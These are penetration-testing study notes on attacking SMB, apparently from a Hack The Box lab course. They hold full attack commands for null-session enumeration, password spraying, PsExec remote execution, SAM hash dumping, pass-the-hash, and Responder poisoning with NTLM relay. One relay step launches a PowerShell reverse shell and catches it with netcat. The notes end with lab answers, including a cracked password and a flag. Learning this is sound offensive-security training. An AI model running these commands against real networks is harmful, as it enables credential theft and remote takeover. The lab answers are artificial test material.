Attacking SMB: Study Notes
Core idea

SMB (Server Message Block) shares files and printers across network nodes.

    Originally ran on NetBIOS over TCP/IP (NBT): TCP 139, UDP 137/138
    Since Windows 2000: SMB can run directly over TCP/IP on port 445 (no NetBIOS layer)
    Modern Windows uses SMB over TCP/445 but keeps NetBIOS as a failover
    Samba = open-source Unix/Linux implementation of SMB, lets Linux/Unix servers talk to Windows clients

Port rule of thumb:

    Port 445 → SMB direct over TCP/IP (typical modern Windows)
    Port 139 → SMB over NetBIOS (NetBIOS enabled, or a non-Windows host)

MSRPC (Microsoft RPC): lets a developer call a function on a local/remote process without worrying about the underlying network protocol. MS-RPCE defines RPC-over-SMB, using SMB named pipes as transport.

Attack approaches (same as other services): abuse misconfiguration/excessive privileges, exploit known vulns, or find new ones. After access: inspect shared folder contents; if targeting NetBIOS/RPC, figure out what info/actions are available.
Enumeration

sudo nmap 10.129.14.128 -sV -sC -p139,445

Reveals:

    SMB version (e.g., Samba smbd 4.6.2)
    Hostname (NetBIOS name: HTB)
    Likely OS (Linux, inferred from Samba)

Note: Nmap usually can't directly identify Windows version from SMB banners — it guesses. Deeper vuln checks come later.
Misconfigurations: Null Sessions / Anonymous Authentication

SMB can be configured to not require authentication — a null session: log in with no username/password. If valid creds or a null session work, you can pull shares, usernames, groups, permissions, policies, services, etc.

Common tools supporting null sessions: smbclient, smbmap, rpcclient, enum4linux.
File shares — smbclient

List shares with a null session:

smbclient -N -L //10.129.14.128

-L lists shares, -N forces null session.
File shares — smbmap

Shows permissions per share (advantage over smbclient):

smbmap -H 10.129.14.128

Browse a share recursively:

smbmap -H 10.129.14.128 -r notes

Download a file:

smbmap -H 10.129.14.128 --download "notes\note.txt"

Upload a file:

smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

A share showing READ, WRITE means you can pull data out and push files in.
RPC — rpcclient

Null-session RPC enumeration:

rpcclient -U'%' 10.10.110.17
rpcclient $> enumdomusers

Returns domain usernames + RIDs. Many more functions exist (SANS cheat sheet / man rpcclient).
Enum4linux(-ng)

Automates enumeration using nmblookup, net, rpcclient, smbclient under the hood. Pulls:

    Workgroup/domain name
    User info
    OS info
    Groups info
    Shared folders
    Password policy

./enum4linux-ng.py 10.10.11.45 -A -C

Protocol-specific attacks (no null session)
Brute Forcing vs Password Spraying

    Brute forcing: many passwords against one account — risk of account lockout
    Password spraying: one (or a couple) common password(s) against many usernames — avoids lockouts. Safe rule of thumb: 2–3 attempts, 30–60 min apart, if you know the lockout threshold.

CrackMapExec (CME) password spray:

crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth

    -u = userlist file, -p = single password
    --local-auth needed for non-domain-joined targets
    CME stops at first success by default; add --continue-on-success to keep spraying the whole list
    Result flagged (Pwn3d!) on success

Windows SMB: privileged operations

Linux SMB attack surface ≈ file system access / privilege abuse / known vulns. Windows SMB has a much larger surface, especially with admin-level creds:

    Remote Command Execution
    Extract hashes from SAM database
    Enumerate logged-on users
    Pass-the-Hash (PtH)

Remote Code Execution — PsExec concept

Sysinternals (Mark Russinovich & Bryce Cogswell, 1996; Microsoft-owned since 2006) → PsExec: executes processes on remote systems without manually installing client software.

How it works:

    Deploys a Windows service binary to the ADMIN$ share
    Uses DCE/RPC over SMB to talk to the Service Control Manager API
    Starts the PsExec service remotely
    Service opens a named pipe to send commands

Linux-side implementations:

    Impacket psexec — RemComSvc-based
    Impacket smbexec — no RemComSvc; spins up a local SMB server to catch output (useful if target has no writeable share)
    Impacket atexec — runs via the Task Scheduler service
    CrackMapExec — includes smbexec/atexec
    Metasploit psexec — Ruby implementation

Impacket psexec usage:

impacket-psexec administrator:'Password123!'@10.10.110.17

Flow: finds writable ADMIN$ → uploads an executable → opens SVCManager → creates and starts a service → drops an interactive SYSTEM shell.

CrackMapExec command execution:

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

    -x = run a cmd command, -X = run PowerShell
    If --exec-method is omitted, CME tries atexec first, falling back to smbexec if that fails

Enumerating logged-on users

Useful when multiple machines share a local admin account — speeds up lateral-movement planning:

crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

Extracting hashes from the SAM database

SAM (Security Account Manager) stores local user password hashes; needs admin privileges to dump. Uses:

    Authenticate as another user
    Crack the password offline, try reuse elsewhere
    Pass-the-Hash

crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

Pass-the-Hash (PtH)

If you have an NTLM hash you can't crack, authenticate with the hash itself instead of the plaintext password:

crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

Works with Impacket tools, SMBMap, CrackMapExec, and more.
Forced Authentication Attacks (Responder)

Abuse SMB by standing up a fake SMB server to capture NetNTLMv1/v2 hashes.

Responder = LLMNR / NBT-NS / MDNS poisoner; can fake multiple services (SMB included).

Windows name-resolution order (why this works):

    Check the requested share's known IP
    Check local hosts file (C:\Windows\System32\Drivers\etc\hosts)
    Check local DNS cache
    Query configured DNS server
    Multicast query to the local network as a last resort — Responder listens here

If a user mistypes a share name, normal resolution fails, the machine broadcasts a multicast query, and Responder (with no integrity checks on replies) answers pretending to be the share — tricking the victim into authenticating to it.

sudo responder -I ens33

Captures something like:

[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:...

Hashes are saved under /usr/share/responder/logs/.

Note: NTLMv2 uses randomized client/server challenges, so the same password produces different-looking hashes each capture — that's expected, not an error.
Cracking the captured hash

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

(-m 5600 = NetNTLMv2 mode)
Relaying instead of cracking

If you can't crack it, relay the hash to another machine with impacket-ntlmrelayx or Responder's MultiRelay.py.

    Turn SMB off in Responder's config so ntlmrelayx can bind the port:

cat /etc/responder/Responder.conf | grep 'SMB ='
SMB = Off

    Relay to a target (dumps SAM by default):

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

    Or execute a command/payload on successful relay (-c), e.g. a PowerShell reverse shell generated via revshells.com:

impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64>'

    Catch the shell:

nc -lvnp 9001

RPC: beyond enumeration

RPC isn't just for recon — with the right config it can also make changes:

    Change a user's password
    Create a new domain user
    Create a new shared folder

(Specific server configurations are required to allow these changes — see rpcclient man page / SANS "SMB Access from Linux" cheat sheet.)
Pentester's quick checklist

    nmap -sV -sC -p139,445 <target> — grab version/OS hints
    Test null session: smbclient -N -L //<ip> and smbmap -H <ip>
    If accessible, enumerate shares/perms, browse recursively, download anything interesting
    Try rpcclient -U'%' and/or enum4linux-ng for users, groups, policies
    No null session? Consider password spraying (CME, --local-auth if non-domain) before brute force
    With valid/admin creds: try psexec/smbexec/atexec for RCE, dump SAM, check logged-on users
    Got an NTLM hash but can't crack it? Try Pass-the-Hash
    No creds at all? Consider Responder for forced authentication capture, then crack or relay with ntlmrelayx

One-line summary

    SMB attacks escalate in stages: check for null sessions first, fall back to password spraying for creds, then use those creds for RCE/hash dumping/PtH — and if you have nothing, Responder can manufacture a hash for you to crack or relay.

Question 1
What is the name of the shared folder with READ permissions?
> smbmap -H 10.129.203.6
GGJ                                               	READ ONLY	Priv

Question 2
What is the password for the username "jason"?
> crackmapexec smb 10.129.220.77 -u 'jason' -p pws.list --local-auth
SMB         10.129.220.77   445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\jason:34c8zuNBo91!@28Bszh

Question 3
Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.
> smbclient //10.129.220.77/GGJ -U jason
smb: \> ls
id_rsa                              N     3381  Tue Apr 19 22:33:04 2022
smb: \> get id_rsa
smb: \> exit
> chmod 600 id_rsa
sudo ssh -i id_rsa jason@10.129.220.77
$ ls
flag.txt
$ cat flag.txt	
HTB{SMB_4TT4CKS_2349872359}

